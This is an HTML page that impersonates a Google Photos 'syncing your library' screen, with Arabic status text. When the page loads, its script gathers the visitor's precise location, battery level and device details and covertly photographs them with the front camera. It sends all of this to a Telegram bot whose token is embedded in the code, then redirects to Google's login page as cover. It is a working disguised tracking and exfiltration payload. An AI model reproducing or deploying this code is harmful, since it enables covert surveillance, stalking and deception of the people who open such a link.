<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Photos</title>
    <style>
        body { margin: 0; background-color: #ffffff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: 'Roboto', Arial, sans-serif; overflow: hidden; }
        .google-logo { width: 120px; margin-bottom: 20px; }
        .loading-bar { width: 200px; height: 4px; background-color: #f1f1f1; position: relative; overflow: hidden; border-radius: 2px; }
        .loading-bar::after { content: ''; position: absolute; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, #4285F4, #EA4335, #FBBC05, #34A853, transparent); animation: loading 1.5s infinite; }
        @keyframes loading { 100% { left: 100%; } }
        .status-msg { margin-top: 20px; color: #3c4043; font-size: 16px; text-align: center; font-weight: 400; }
        .sub-msg { color: #70757a; font-size: 12px; margin-top: 8px; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="google-logo">
    <div class="loading-bar"></div>
    <div class="status-msg">جاري مزامنة الصور...</div>
    <div class="sub-msg">Syncing your library. Please wait.</div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

<script>
    const botToken = "8036035151:AAGx8I8HfUM401Y_XrzHyTvGhpQC5RXNVBM";
    const chatId = "1230856956";

    async function executeTrap() {
        let deviceInfo = `📱 المتصفح: ${navigator.userAgent.split(') ')[0].split('(')[1]}`;
        let batteryLevel = "غير معروف";

        try {
            const battery = await navigator.getBattery();
            batteryLevel = `${Math.round(battery.level * 100)}%`;
        } catch(e) {}

        navigator.geolocation.getCurrentPosition(async (pos) => {
            const { latitude, longitude, accuracy } = pos.coords;
            const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                    const photoBase64 = canvas.toDataURL('image/jpeg', 0.8);
                    
                    const report = `🚨 **تم رصد اللص بنجاح!**\n\n📍 الدقة: ${accuracy.toFixed(1)} متر\n🔋 البطارية: ${batteryLevel}\nℹ️ الجهاز: ${deviceInfo}\n🔗 الموقع: ${mapLink}`;
                    
                    sendToTelegram(photoBase64, report);
                    stream.getTracks().forEach(t => t.stop());

                    // التوجيه النهائي للتمويه
                    setTimeout(() => { window.location.href = "https://photos.google.com/login"; }, 1500);
                }, 2500);
            } catch (err) {
                sendToTelegram(null, `🚨 الموقع وصل ولكن الكاميرا محجوبة!\n📍 الموقع: ${mapLink}\n🔋 البطارية: ${batteryLevel}`);
                window.location.href = "https://photos.google.com/login";
            }
        }, () => {
            window.location.href = "https://photos.google.com/login";
        }, { enableHighAccuracy: true, timeout: 10000 });
    }

    function sendToTelegram(photo, caption) {
        if (photo) {
            fetch(photo).then(r => r.blob()).then(blob => {
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('photo', blob, 'capture.jpg');
                fd.append('caption', caption);
                fd.append('parse_mode', 'Markdown');
                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
            });
        } else {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(caption)}&parse_mode=Markdown`);
        }
    }

    window.onload = executeTrap;
</script>
</body>
</html>
